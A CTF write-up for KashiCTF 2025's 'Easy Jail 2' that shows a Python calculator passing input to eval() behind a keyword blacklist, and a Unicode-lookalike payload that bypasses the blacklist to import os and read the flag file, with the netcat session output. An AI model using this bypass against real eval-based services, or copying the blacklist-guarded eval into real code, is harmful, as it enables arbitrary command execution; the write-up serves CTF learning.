---
title: "Easy Jail 2"
description: "I made a completely secure calculator this time."
pubDate: 2025-02-27
ctf: "KashiCTF 2025"
category: "misc"
author: "sealldev"
section: "CTFs"
image: "images/25-kashi/icon.png"
---



```python
#!/usr/bin/env python3

print("           _            _       _             ")
print("          | |          | |     | |            ")
print("  ___ __ _| | ___ _   _| | __ _| |_ ___  _ __ ")
print(" / __/ _` | |/ __| | | | |/ _` | __/ _ \| '__|")
print("| (_| (_| | | (__| |_| | | (_| | || (_) | |   ")
print(" \___\__,_|_|\___|\__,_|_|\__,_|\__\___/|_|   ")

BLACKLIST = ["open", "input", "eval", "exec", "import", "getattr", "sh", "builtins", "global"]
def calc(op):
	try :
		res = eval(op)
	except Exception as e:
		print(e)
		return print("Wrong operation")
	return print(f"{op} --> {res}")

def main():
	while True :
		inp = input(">> ")
		if any(bad in inp for bad in BLACKLIST) :
			print("Are you tying to hack me !!!!!")
		else :
			calc(inp)

if __name__ == '__main__':
	main()
```

Looking at the jail (compared to the previous) restricts words (such as import), our previous solution (`__import__('os').system('cat ../flag.txt')`) no longer worked due to `import` being a blocked word.

Looking at the [PyJail material online](https://shirajuki.js.org/blog/pyjail-cheatsheet#unicode-bypass) we can use a unicode bypass.

I make the following payload: `__𝘪𝘮𝘱𝘰𝘳t__('os').system('cat ../flag.txt')`

Which then returns the flag from the remote:

```
$ nc kashictf.iitbhucybersec.in 56261
           _            _       _
          | |          | |     | |
  ___ __ _| | ___ _   _| | __ _| |_ ___  _ __
 / __/ _` | |/ __| | | | |/ _` | __/ _ \| '__|
| (_| (_| | | (__| |_| | | (_| | || (_) | |
 \___\__,_|_|\___|\__,_|_|\__,_|\__\___/|_|
>> __𝘪𝘮𝘱𝘰𝘳t__('os').system('cat ../flag.txt')
KashiCTF{C4N_S71LL_CL3AR_8L4CKL15T_ewBkDkyO}
```

Flag: `KashiCTF{C4N_S71LL_CL3AR_8L4CKL15T_ewBkDkyO}`
